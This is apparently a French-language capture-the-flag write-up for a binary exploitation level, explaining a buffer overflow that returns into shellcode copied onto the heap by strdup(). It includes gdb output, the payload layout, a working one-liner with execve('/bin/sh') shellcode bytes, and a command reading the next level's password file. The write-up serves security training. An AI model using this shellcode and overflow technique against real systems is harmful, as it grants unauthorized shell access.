# level2 - Exploitation du Heap via strdup()

## Analyse du Programme

**Structure du Programme**
- Le `main()` appelle une fonction `p()`
- La fonction `p()` vérifie si l'adresse de retour contient `0xb`
- Utilisation de `strdup()` qui alloue de la mémoire dans le heap

**Points Clés**
- Utilisation d'un shellcode ?

`Le shellcode de la stack/heap est une technique utilisée dans l'exploitation binaire où un attaquant écrit un shellcode dans la pile/heap d'un programme vulnérable, puis modifie le Pointeur d'Instruction (IP) ou le Pointeur d'Instruction Étendu (EIP) pour pointer vers l'emplacement de ce shellcode, le forçant à s'exécuter.`
- Adresse de retour de `strdup()`: `0x804a008`
- Offset du buffer overflow: 80 bytes (Pour modifier le retour de la fonction `p()` pour pointer vers notre shellcode)
- Shellcode length: 21 bytes
- Padding nécessaire: 59 bytes (80 - 21)
- En executant la commande i f (info frame) on observe que notre saved eip est a l'adresse `0x804854a`

```nasm
eip = 0x8048505 in p; saved eip 0x804854a
```

- En affichant son instruction on voit bien qu'il s'agit d'un retour a la fonction main 

```nasm
(gdb) x/i 0x804854a
   0x804854a <main+11>: leave
```

- Avec un payload on veut pouvoir modifier ce retour pour pointer vers notre shellcode qui va executer un execve("bin/sh")
- Le shellcode a ete trouve en ligne sur ce site : `http://shell-storm.org/shellcode/files/shellcode-575.html`

```nasm
(gdb) i f
Stack level 0, frame at 0xbffff640:
 eip = 0x8048505 in p; saved eip 0x804a008
```

## Stratégie d'Exploitation

**Contournement de la Protection**
- Le programme vérifie si l'adresse de retour contient `0xb`
- L'utilisation du heap via `strdup()` permet de contourner cette protection
- L'exécution de code en mémoire est active

Comme on peut le voir ci-dessous, les fonctions libc sont sur les plages 0xb donc inutilisables avec la verification :
```nasm
(gdb) info proc mappings 
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
         0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
        0xb7e2b000 0xb7e2c000     0x1000        0x0 
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0 
        0xb7fda000 0xb7fdd000     0x3000        0x0 
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```
- L'utilisation d'un call a system() de libc est donc impossible

**Construction du Payload**
1. Shellcode en début de payload (21 bytes)
2. Padding de 59 bytes
3. Adresse de retour de `strdup()`

## Exploitation

**Commande d'Exploitation**
```bash
(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"'; cat) | ./level2
```

**Obtention du Flag**
```bash
cat /home/user/level3/.pass
```

Cette exploitation fonctionne car le shellcode est exécuté depuis le heap, évitant ainsi la vérification de l'adresse de retour contenant `0xb`.
